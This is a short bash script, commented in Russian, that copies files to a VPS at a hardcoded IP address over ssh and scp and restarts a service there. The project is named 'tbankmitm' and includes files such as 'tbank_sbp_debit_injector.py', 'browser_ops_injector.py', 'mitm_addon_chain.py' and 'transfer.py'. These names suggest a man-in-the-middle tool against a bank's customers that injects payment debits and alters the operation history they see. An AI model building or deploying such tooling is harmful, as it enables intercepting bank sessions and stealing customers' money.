#!/usr/bin/env bash
# Залить локальные фиксы на VPS.
#   export VPS_HOST=root@188.127.237.61
#   bash deploy_to_vps.sh
set -euo pipefail
ROOT="$(cd "$(dirname "$0")" && pwd)"
HOST="${VPS_HOST:-root@188.127.237.61}"
REMOTE="${VPS_REMOTE_DIR:-~/tbankmitm/tbankmitm}"

FILES=(
  history.py
  bank_filter.py
  browser_ops_injector.py
  operation_detail.py
  panel_bridge.py
  transfer.py
  func.py
  tbank_sbp_debit_injector.py
  mitm_addon_chain.py
  tls_passthrough_hosts.py
  controller.py
  config.json
  panel.html
  start_vps.sh
  mitm_run_dump.py
  nonbank_connect_block.py
  vps_hotfix_inject.py
  _action_buttons_row_inner.html
  _action_buttons_disallow_only_inner.html
  _reference_account_molecule.html
)

LOCAL=()
for f in "${FILES[@]}"; do
  LOCAL+=("$ROOT/$f")
done

echo "Deploy -> ${HOST}:${REMOTE}"
ssh "$HOST" "mkdir -p ${REMOTE}/panel_static/webfonts"
scp "${LOCAL[@]}" "${HOST}:${REMOTE}/"
scp -r "${ROOT}/panel_static/"* "${HOST}:${REMOTE}/panel_static/"
ssh "$HOST" "cd ${REMOTE} && pkill -f mitm_run_dump || true; sleep 1; export TBANKMITM_PUBLIC_IP=188.127.237.61 TBANKMITM_PANEL_ALLOW_ANY=1; nohup bash start_vps.sh >/tmp/tbankmitm.log 2>&1 & sleep 3; curl -s -o /dev/null -w 'api %{http_code}\n' http://127.0.0.1:8082/api/operations || true"
echo "Done."
